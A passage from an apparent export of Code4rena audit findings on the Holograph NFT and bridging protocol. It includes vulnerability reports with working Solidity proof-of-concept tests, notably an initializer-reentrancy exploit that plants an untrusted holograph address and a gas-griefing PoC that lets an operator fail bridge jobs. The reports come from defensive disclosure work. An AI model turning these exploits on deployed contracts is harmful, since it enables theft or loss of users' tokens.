transfer NFTs of users without their permission. ## Proof of Concept Every Holographed ERC721 collection is paired with a source contract, which is the user created contract that's extended by the Holographed ERC721 contract ([HolographFactory.sol#L234-L246](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L234-L246)). A source contract, however, has excessive privileges in the Holographed ERC721. Specifically, it can burn and transfer users' NFTs without their approval ([HolographERC721.sol#L500](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500), [HolographERC721.sol#L577](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577)): ```solidity function sourceBurn(uint256 tokenId) external onlySource {   address wallet = _tokenOwner[tokenId];   _burn(wallet, tokenId); }  function sourceTransfer(address to, uint256 tokenId) external onlySource {   address wallet = _tokenOwner[tokenId];   _transferFrom(wallet, to, tokenId); } ```  While this might be desirable for extensibility and flexibility, this puts users at the risk of being robbed by the source contract owner or a hacker who hacked the source contract owner's key. ## Tools Used Manual review ## Recommended Mitigation Steps Consider removing the `sourceBurn` and `sourceTransfer` functions of `HolographERC721` and requiring user approval to transfer or burn their tokens (`burn` and `safeTransferFrom` can be called by a source contract instead of `sourceBurn` and `sourceTransfer`)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/285", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/martin-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/278", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Shinchan-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/273", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ch0bu-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/272", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/karanctf-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/271", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/bin2chen-Q.md)."}, {"title": "ApprovalAll event is missing parameters", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/270", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/HolographERC721.sol#L392   # Vulnerability details  ## Impact beforeApprovalAll() / afterApprovalAll() can only pass \"to\" and \"approved\", missing \"owner\", if contract listening to this event,but does not know who approve it, so can not react to this event Basically, this event cannot be used  ## Proof of Concept ```   function setApprovalForAll(address to, bool approved) external { ....      if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {       require(SourceERC721().beforeApprovalAll(to, approved)); /***** only to/approved ,need owner     }        _operatorApprovals[msg.sender][to] = approved;      if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {       require(SourceERC721().afterApprovalAll(to, approved)); /***** only to/approved ,need owner     }   } ```  ## Tools Used  ## Recommended Mitigation Steps   add parameter: owner   ``` interface HolographedERC721 { ...  - function beforeApprovalAll(address _to, bool _approved) external returns (bool success); + function beforeApprovalAll(address owner, address _to, bool _approved) external returns (bool success);  - function afterApprovalAll(address _to, bool _approved) external returns (bool success); + function afterApprovalAll(address owner, address _to, bool _approved) external returns (bool success); ```  ```   function setApprovalForAll(address to, bool approved) external {      if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) { -     require(SourceERC721().beforeApprovalAll(to, approved));  +     require(SourceERC721().beforeApprovalAll(msg.sender,to, approved));      }        _operatorApprovals[msg.sender][to] = approved;      if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) { -      require(SourceERC721().afterApprovalAll(to, approved)); +      require(SourceERC721().afterApprovalAll(msg.sender,to, approved));     }   } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/267", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/iepathos-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/265", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/catchup-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/258", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/vv7-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/226", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/erictee-G.md)."}, {"title": "Holographable tokens can be reinitialized", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/215", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L147-L169   # Vulnerability details  When new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the `HolographFactory`, the holograph contract is [passed in as a parameter](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252) to the holographable contract's initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its `_holographSlot`.  However, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a [delegate call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164) to a corresponding enforcer contract. From here, the enforcer contract makes an [optional call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241) to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract's initialize function before the first one has been completed and overwrite key variables such as the `_adminslot`, the `_holographSlot` and the `_sourceContractSlot`.   One way in which this becomes problematic is because of how holographed ERC20s perform `transferFrom` calls. Holographed ERC20s by default allow two special addresses to [transfer](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527) assets on behalf of other users without an allowance. These addresses are calculated by calling `_holograph().getBridge()` and `_holograph().getOperator()` respectively. With the above described reentrancy issue, `_holograph().getBridge()` and `_holograph().getOperator()` can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.  ## Proof of Concept: ``` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\"; import \"../contracts/HolographFactory.sol\"; import \"../contracts/HolographRegistry.sol\"; import \"../contracts/Holograph.sol\"; import \"../contracts/enforcer/HolographERC20.sol\";  //Contract used to show reentrancy in initializer contract SourceContract {     address public holographer;     MockContract public mc;      constructor() {          mc = new MockContract();     }      //function that reenters the holographer and sets this contract as the new holograph slot     function init(bytes memory initPayload) external returns(bytes4) {         assembly {             sstore(holographer.slot, caller())         }         bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32(\"0xabc\"), address(this)), bytes(\"0x0\"));          holographer.call(abi.encodeWithSignature(\"init(bytes)\", initCode));         return InitializableInterface.init.selector;     }      function getRegistry() external view returns (address) {         return address(this);     }      function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {         return address(mc);     }      function isTheHolograph() external pure returns (bool) {         return true;     }  }  //simple extension contract to return easily during reinitialization contract MockContract {     constructor() {}      function init(bytes memory initPayload) external pure returns(bytes4) {         return InitializableInterface.init.selector;     } }  contract HolographTest is Test {     DeploymentConfig public config;     Verification public verifiedSignature;     HolographFactory public hf;     HolographRegistry public hr;     Holograph public h;     HolographERC20 public he20;      uint256 internal userPrivateKey;     address internal hrAdmin;     mapping(uint256 => bool) public _burnedTokens;     address internal user;     function setUp() public {         //Creating all of the required objects         hf = new HolographFactory();         hr = new HolographRegistry();         h = new Holograph();         he20 = new HolographERC20();          //Setting up the registry admin         hrAdmin = vm.addr(100);          //Creating factory, holograph, and registry init payloads         bytes memory hfInitPayload = abi.encode(address(h), address(hr));         hf.init(hfInitPayload);         bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));         h.init(hInitPayload);         bytes32[] memory reservedTypes = new bytes32[](1);         reservedTypes[0] = \"0xabc\";         bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);          //Setting up a contract type address for the ERC20 enforcer         vm.startPrank(hrAdmin, hrAdmin);         hr.init(hrInitPayload);         hr.setContractTypeAddress(reservedTypes[0], address(he20));         vm.stopPrank();          //Keys used to sign transaction for deployment         userPrivateKey = 0x1337;         user = vm.addr(userPrivateKey);     }      function testDeployShadyHolographer() public {         //setting up the configuration, contract type is not important         config.contractType = \"0xabc\";         config.chainType = 1;         config.salt = \"0x12345\";         config.byteCode = type(SourceContract).creationCode;         bytes memory initCode = \"0x123\";          //giving our token some semi-realistic metadata         config.initCode = abi.encode(\"HToken\", \"HT\", uint8(18), uint256(0), \"HTdomainSeparator\", \"HTdomainVersion\", false, initCode);          //creating the hash for our user to sign         bytes32 hash = keccak256(             abi.encodePacked(                 config.contractType,                 config.chainType,                 config.salt,                 keccak256(config.byteCode),                 keccak256(config.initCode),                 user             ));          //signing the hash and creating the verified signature         (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);         verifiedSignature.r = r;         verifiedSignature.v = v;         verifiedSignature.s = s;          //deploying our new source contract and holographable contract pair         hf.deployHolographableContract(config, verifiedSignature, user);          //after the reentrancy has affected the initialization, we grab the holographer address from the registry         address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));          //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract         assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);     } } ``` ## Recommended Mitigation Steps  Consider checking whether the contract is in an \"initializing\" phase such as is done in OpenZeppelin's [`Initializable`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83) library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements. "}, {"title": "HolographERC721.approve not EIP-721 compliant", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/205", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L272   # Vulnerability details  ## Impact According to EIP-721, we have for `approve`: ```solidity ///  Throws unless `msg.sender` is the current NFT owner, or an authorized ///  operator of the current owner. ``` An operator in the context of EIP-721 is someone who was approved via `setApprovalForAll`: ```solidity /// @notice Enable or disable approval for a third party (\"operator\") to manage ///  all of `msg.sender`'s assets /// @dev Emits the ApprovalForAll event. The contract MUST allow ///  multiple operators per owner. /// @param _operator Address to add to the set of authorized operators /// @param _approved True if the operator is approved, false to revoke approval function setApprovalForAll(address _operator, bool _approved) external; ``` Besides operators, there are also approved addresses for a token (for which `approve` is used). However, approved addresses can only transfer the token, see for instance the `safeTransferFrom` description: ```solidity /// @dev Throws unless `msg.sender` is the current owner, an authorized ///  operator, or the approved address for this NFT. ``` `HolographERC721` does not distinguish between authorized operators and approved addresses when it comes to the `approve` function. Because `_isApproved(msg.sender, tokenId)` is used there, an approved address can approve another address, which is a violation of the EIP (only authorized operators should be able to do so).  ## Proof Of Concept Bob calls `approve` to approve Alice on token ID 42 (that is owned by Bob). One week later, Bob sees that a malicious address was approved for his token ID 42 (e.g., because Alice got phished) and stole his token. Bob wonders how this is possible, because Alice should not have the permission to approve other addresses. However, becaue `HolographERC721` did not follow EIP-721, it was possible.  ## Recommended Mitigation Steps Follow the EIP, i.e. do not allow approved addresses to approve other addresses."}, {"title": "HolographERC721.safeTransferFrom not compliant with EIP-721", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/203", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L366   # Vulnerability details  ## Impact According to EIP-721, we have the following for `safeTransferFrom`: ```solidity ///  (...) When transfer is complete, this function ///  checks if `_to` is a smart contract (code size > 0). If so, it calls ///  `onERC721Received` on `_to` and throws if the return value is not ///  `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`. ``` According to the specification, the function must therefore always call `onERC721Received`, not only when it has determined via ERC-165 that the contract provides this function. Note that in the EIP, the provided interface for `ERC721TokenReceiver` does not mention ERC-165. For the token itself, we have: `interface ERC721 /* is ERC165 */ {` However, for the receiver, the provided interface there is just: `interface ERC721TokenReceiver {` This leads to failed transfers when they should not fail, because many receivers will just implement the `onERC721Received` function (which is sufficient according to the EIP), and not `supportsInterface` for ERC-165 support.  ## Proof Of Concept Let's say a receiver just implements the `IERC721Receiver` from OpenZeppelin: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol Like the provided interface in the EIP itself, this interface does not derive from EIP-165. All of these receivers (which are most receivers in practice) will not be able to receive those tokens, because the `require` statement (that checks for ERC-165 support) reverts.  ## Recommended Mitigation Steps Remove the ERC-165 check in the `require` statement (like OpenZeppelin does: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436)"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/192", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Jujic-G.md)."}, {"title": "PA1D#bidSharesForToken returns incorrect bidShares.creator.value", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/180", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L665-L675   # Vulnerability details  ## Impact  bidShares returned are incorrect leading to incorrect royalties  ## Proof of Concept  [Zora Market](https://etherscan.io/address/0xe5bfab544eca83849c53464f85b7164375bdaac1#code#F1#L113)      function isValidBidShares(BidShares memory bidShares)         public         pure         override         returns (bool)     {         return             bidShares.creator.value.add(bidShares.owner.value).add(                 bidShares.prevOwner.value             ) == uint256(100).mul(Decimal.BASE);     }  Above you can see the Zora market lines that validate bidShares, which shows that Zora market bidShare.values should be percentages written out to 18 decimals. However PA1D#bidSharesForToken sets the bidShares.creator.value to the raw basis points set by the owner, which is many order of magnitudes different than expected.     ## Tools Used  Manual Review  ## Recommended Mitigation Steps  To return the proper value, basis points returned need to be adjusted. Convert from basis points to percentage by dividing by 10 ** 2 (100) then scale to 18 decimals. The final result it to multiple the basis point by 10 ** (18 - 2) or 10 ** 16:       function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {         // this information is outside of the scope of our         bidShares.prevOwner.value = 0;         bidShares.owner.value = 0;         if (_getReceiver(tokenId) == address(0)) {     -       bidShares.creator.value = _getDefaultBp();     +       bidShares.creator.value = _getDefaultBp() * (10 ** 16);         } else {     -       bidShares.creator.value = _getBp(tokenId);     +       bidShares.creator.value = _getBp(tokenId) * (10 ** 16);         }         return bidShares;     }"}, {"title": "Gas limit check is inaccurate, leading to an operator being able to fail a job intentionally  ", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/176", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "resolved", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L316   # Vulnerability details  There's a check at line 316 that verifies that there's enough gas left to execute the `HolographBridge.bridgeInRequest()` with the `gasLimit` set by the user, however the actual amount of gas left during the call is less than that (mainly due to the 1/64 rule, see below). An attacker can use that gap to fail the job while still having the `executeJob()` function complete.   ## Impact The owner of the bridged token would loose access to the token since the job failed.  ## Proof of Concept Besides using a few units of gas between the check and the actual call, there's also a rule that only 63/64 of the remaining gas would be dedicated to an (external) function call. Since there are 2 external function calls done (`nonRevertingBridgeCall()` and the actual call to the bridge) ~2/64 of the gas isn't sent to the bridge call and can be used after the bridge call runs out of gas.   The following PoC shows that if the amount of gas left before the call is at least 1 million then the execution can continue after the bridge call fails:  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0;  import \"forge-std/Test.sol\";  contract ContractTest is Test {     event FailedOperatorJob(bytes32 jobHash);     uint256 private _inboundMessageCounter;     mapping(bytes32 => bool) private _failedJobs;     constructor(){         _inboundMessageCounter = 5;     }     function testGas64() public {         this.entryPoint{gas:1000000}();     }      Bridge bridge = new Bridge();     event GasLeftAfterFail(uint left);      function entryPoint() public {          console2.log(\"Gas left before call: \", gasleft());          bytes32 hash = 0x987744358512a04274ccfb3d9649da3c116cd6b19c535e633ef8529a80cb06a0;          try this.intermediate(){         }catch{             // check out how much gas is left after the call to the bridge failed             console2.log(\"Gas left after failure: \", gasleft());             // simulate operations done after failure             _failedJobs[hash] = true;             emit FailedOperatorJob(hash);         }         ++_inboundMessageCounter;         console2.log(\"Gas left at end: \", gasleft());      }      function intermediate() public{         bridge.bridgeCall();     } }   contract Bridge{     event Done(uint gasLeft);      uint256[] myArr;      function bridgeCall() public {         for(uint i =1; i <= 100; i++){             myArr.push(i);         }         // this line would never be reached, we'll be out of gas beforehand         emit Done(gasleft());     } }  ```  Output of PoC: ```   Gas left before call:  999772   Gas left after failure:  30672   Gas left at end:  1628 ```  Side note: due to some bug in forge `_inboundMessageCounter` would be considered warm even though it's not necessarily the case. However in a real world scenario we can warm it up if the selected operator is a contract and we'er using another operator contract to execute a job in the same tx beforehand.   Reference for the 1/64 rule - [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md). Also check out [evm.codes](https://www.evm.codes/#f1?fork=grayGlacier:~:text=From%20the%20Tangerine%20Whistle%20fork%2C%20gas%20is%20capped%20at%20all%20but%20one%2064th%20(remaining_gas%20/%2064)%20of%20the%20remaining%20gas%20of%20the%20current%20context.%20If%20a%20call%20tries%20to%20send%20more%2C%20the%20gas%20is%20changed%20to%20match%20the%20maximum%20allowed.).   ## Recommended Mitigation Steps Modify the required amount of gas left to gasLimit + any amount of gas spent before reaching the `call()`, then multiply it by 32/30 to mitigate the 1/64 rule (+ some margin of safety maybe)."}, {"title": "Beaming job might freeze on dest chain under some conditions, leading to owner loosing (temporarily) access to token", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/170", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "edited-by-warden", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L255   # Vulnerability details  ## Impact  If the following conditions have been met: * The selected operator doesn't complete the job, either intentionally (they're sacrificing their bonded amount to harm the token owner) or innocently (hardware failure that caused a loss of access to the wallet)  * Gas price has spiked, and isn't going down than the `gasPrice` set by the user in the bridge out request  Then the bridging request wouldn't complete and the token owner would loos access to the token till the gas price goes back down again.   ## Proof of Concept The fact that no one but the selected operator can execute the job in case of a gas spike has been proven by the test ['Should fail if there has been a gas spike'](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/test/14_holograph_operator_tests.ts#L834-L844) provided by the sponsor.  An example of a price spike can be in the recent month in the Ethereum Mainnet where the min gas price was 3 at Oct 8, but jumped to 14 the day after and didn't go down since then (the min on Oct 9 was lower than the avg of Oct8, but users might witness a momentarily low gas price and try to hope on it). See the [gas price chat on Etherscan](https://etherscan.io/chart/gasprice) for more details.  ## Recommended Mitigation Steps  In case of a gas price spike, instead of refusing to let other operators to execute the job, let them execute the job without slashing the selected operator. This way, after a while also the owner can execute the job and pay the gas price."}, {"title": "An attacker can manipulate each pod and gain an advantage over the remainder Operators", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/168", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539 https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144   # Vulnerability details  # H001 An attacker can manipulate each pod and gain an advantage over the remainder Operators  ## Impact  In [contracts/HolographOperator.sol#crossChainMessage](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L484-L539), each Operator is selected by:  - Generating a random number ([L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499)) - A pod is selected by dividing the random with the total number of pods, and using the remainder ([L503](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L503)) - An Operator of the selected pod is chosen using the **same** random and dividing by the total number of operators ([L511](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L511)).  This creates an unintended bias since the first criterion (the `random`) is used for both selecting the pod and selecting the Operator, as explained in a previous issue (`M001-Biased distribution`). In this case, an attacker knowing this flaw can continuously monitor the contracts state and see the current number of pods and Operators. Accordingly to the [documentation](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection) and provided [flow](https://github.com/code-423n4/2022-10-holograph/blob/main/docs/IMPORTANT_FLOWS.md#joining-pods):  * An Operator can easily join and leave a pod, albeit when leaving a small fee is paid * An Operator can only join one pod, but an attacker can control multiple Operators * The attacker can then enter and leave a pod to increase (unfairly) his odds of being selected for a job  Honest Operators may feel compelled to leave the protocol if there are no financial incentives (and lose funds in the process), which can also increase the odds of leaving the end-users at the hands of a malicious Operator.  ## Proof of Concept  Consider the following simulation for 10 pods with a varying number of operators follows (X \u2192 \"does not apply\"): | Pod n | Pon len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |  | P0 | 10 | 615 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 615 | | P1 | 3 | 203 | 205 | 207 | X | X | X | X | X | X | X | 615 | | P2 | 6 | 208 | 0 | 233 | 0 | 207 | 0 | X | X | X | X | 648 | | P3 | 9 | 61 | 62 | 69 | 70 | 65 | 69 | 61 | 60 | 54 | X | 571 | | P4 | 4 | 300 | 0 | 292 | 0 | X | X | X | X | X | X | 592 | | P5 | 10 | 0 | 0 | 0 | 0 | 0 | 586 | 0 | 0 | 0 | 0 | 586 | | P6 | 2 | 602 | 0 | X | X | X | X | X | X | X | X | 602 | | P7 | 7 | 93 | 93 | 100 | 99 | 76 | 74 | 78 | X | X | X | 613 | | P8 | 2 | 586 | 0 | X | X | X | X | X | X | X | X | 586 | | P9 | 6 | 0 | 190 | 0 | 189 | 0 | 192 | X | X | X | X | 571 |  At this stage, an attacker Mallory joins the protocol and scans the protocol (or interacts with - e.g. `getTotalPods`, `getPodOperatorsLength`). As an example, after considering the potential benefits, she chooses pod `P9` and sets up some bots `[B1, B2, B3]`. The number of Operators will determine the odds, so:  | Pod P9 | Alt len | Op0 | Op1 | Op2 | Op3 | Op4 | Op5 | Op6 | Op7 | Op8 | Op9 | Total Pod | | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |  | P9A | 4 | 0 | 276 | 0 | 295 | X | X | X | X | X | X | 571 | | P9B | 5 | 0 | 0 | 0 | 0 | 571 | X | X | X | X | X | 571 | | P9 | 6 | 0 | 190 | 0 | 189 | 0 | 192 | X | X | X | X | 571 | | P9C | 7 | 66 | 77 | 81 | 83 | 87 | 90 | 87 | X | X | X | 571 | | P9D | 8 | 0 | 127 | 0 | 147 | 0 | 149 | 0 | 148 | X | X | 571 |  And then:  1. She waits for the next job to fall in `P9` and keeps an eye on the number of pods, since it could change the odds. 2. After an Operator is selected (he [pops](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L518) from the array), the number of available Operators change to 5, and the odds change to `P9B`. 3. She deploys `B1` and it goes to position `Op5`, odds back to `P9`. If the meantime the previously chosen Operator comes back to the `pod`, see the alternative timeline. 4. She now has 1/3 of the probability to be chosen for the next job: 4.1 If she is not chosen, [she will assume the position](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L1138-L1144) of the chosen Operator, and deploys `B2` to maintain the odds of `P9` and controls 2/3 of the pod. 4.2 If she is chosen, she chooses between employing another bot or waiting to execute the job to back to the pod (keeping the original odds). 5. She can then iterate multiple times to swap to the remainder of possible indexes via step 4.1.   Alternative timeline (from previous 3.): 1. The chosen Operator finishes the job and goes back to the pod. Now there's 7 members with uniform odds (`P9C`). 2. Mallory deploys `B2` and the length grows to 8, the odds turn to `P9D` and she now controls two of the four possible indexes from which she can be chosen.  There are a lot of ramifications and possible outcomes that Mallory can manipulate to increase the odds of being selected in her favor.  ## Tools Used  Manual  ## Recommended Mitigation Steps  Has stated in `M001-Biased distribution`, use two random numbers for pod and Operator selection. Ideally, an independent source for randomness should be used, but following the assumption that the one used in [L499](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L499) is safe enough, using the most significant bits (e.g. `random >> 128`) should guarantee an unbiased distribution. Also, reading the [EIP-4399](https://eips.ethereum.org/EIPS/eip-4399) could be valuable.  Additionally, since randomness in blockchain is always tricky to achieve without an oracle provider, consider adding additional controls (e.g. waiting times before joining each pod) to increase the difficulty of manipulating the protocol.  And finally, in this particular case, removing the swapping mechanism (moving the last index to the chosen operator's current index) for another mechanism (shifting could also create conflicts [with backup operators?](https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/HolographOperator.sol#L358-L370)) could also increase the difficulty of manipulating a particular pod.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/158", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/saneryee-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/152", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ret2basic-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/150", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xsam-G.md)."}, {"title": "Implementation code does not align with the business requirement: Users are not charged with withdrawn fee when user unbound token in HolographOperator.sol", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/142", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "selected for report", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899 